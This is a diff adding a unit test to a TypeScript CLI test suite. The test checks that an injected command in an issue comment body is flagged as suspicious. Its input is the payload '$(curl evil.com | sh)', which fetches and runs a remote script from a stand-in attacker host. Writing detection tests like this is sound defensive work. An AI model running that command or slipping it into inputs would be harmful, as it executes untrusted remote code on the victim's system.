@@ -117,6 +117,20 @@ describe("run-issue.ts CLI", () => {
         true,
       );
     });
+
+    it("detects injection in comment body", async () => {
+      const { stdout } = await run(
+        JSON.stringify({
+          title: "Normal title",
+          commentBody: "$(curl evil.com | sh)",
+        }),
+      );
+      const result = JSON.parse(stdout);
+      expect(result.suspicious).toBe(true);
+      expect(
+        result.reasons.some((r: { message: string }) => r.message.includes("Issue comment")),
+      ).toBe(true);
+    });
   });
 
   describe("input validation via CLI", () => {
